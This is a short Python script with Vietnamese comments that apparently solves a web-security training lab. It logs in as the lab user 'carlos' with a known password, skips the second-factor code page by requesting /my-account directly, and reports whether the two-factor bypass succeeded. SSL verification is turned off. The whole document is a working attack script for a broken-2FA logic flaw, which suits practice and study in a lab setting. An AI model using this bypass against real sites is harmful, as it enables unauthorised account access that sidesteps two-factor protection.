import requests
import sys

# Tắt cảnh báo SSL
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    if len(sys.argv) < 2:
        print(f"Sử dụng: {sys.argv[0]} <URL>")
        return

    host = sys.argv[1].rstrip('/')

    # Dùng Session để tự động quản lý Cookie
    s = requests.Session()
    s.verify = False

    # Bước 1: Login bằng Carlos (Mật khẩu cố định của Lab)
    print(f"[+] Login bước 1 cho carlos...")
    s.post(f'{host}/login', data={'username': 'carlos', 'password': 'montoya'})

    # Bước 2: Bỏ qua trang nhập mã, truy cập thẳng Dashboard
    print(f"[+] Truy cập thẳng /my-account...")
    r = s.get(f'{host}/my-account?id=carlos')

    # Kiểm tra kết quả
    if 'Your username is: carlos' in r.text:
        print("[!] BYPASS THÀNH CÔNG!")
    else:
        print("[-] Thất bại. Kiểm tra lại logic Lab hoặc URL.")


if __name__ == "__main__":
    main()